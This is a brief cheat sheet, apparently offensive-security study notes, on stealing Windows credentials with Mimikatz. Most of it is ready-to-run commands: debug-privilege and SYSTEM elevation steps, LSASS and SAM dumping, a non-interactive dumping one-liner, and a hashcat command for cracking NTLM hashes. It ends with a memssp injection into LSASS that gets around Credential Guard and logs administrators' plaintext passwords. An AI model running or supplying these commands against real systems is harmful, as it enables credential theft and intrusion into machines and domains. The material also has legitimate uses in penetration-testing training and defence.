# Mimikatz & Windows Hashes

**SAM database:** Stores NTLM hashes locally. Cannot be copied while OS is running (kernel lock).

**LSASS:** Caches NTLM hashes and credentials in memory. Requires SYSTEM-level access to dump.

## Mimikatz Workflow (requires elevated prompt)

```
mimikatz.exe              (run as admin)
privilege::debug          (enable SeDebugPrivilege)
token::elevate            (elevate to SYSTEM)
sekurlsa::logonpasswords  (dump all creds from LSASS)
lsadump::sam              (dump NTLM hashes from SAM)
```

> Newer mimikatz binary: https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919 (fixes `ERROR kuhl_m_sekurlsa_acquireLSA` when dumping LSASS)

**Mimikatz one-liner (when no interactive shell is available):**
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Crack NTLM hash:**
```bash
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
```

---

## Windows Credential Guard

When Credential Guard is enabled, `sekurlsa::logonpasswords` only dumps local NTLM hashes; domain user credentials are encrypted.

**Check if Credential Guard is enabled:**
```powershell
Get-ComputerInfo | Select DeviceGuard*
```

**Workaround — inject into LSASS with memssp:**
```
misc::memssp
```
Captures plaintext credentials to `C:\Windows\System32\mimilsa.log` when an admin authenticates.
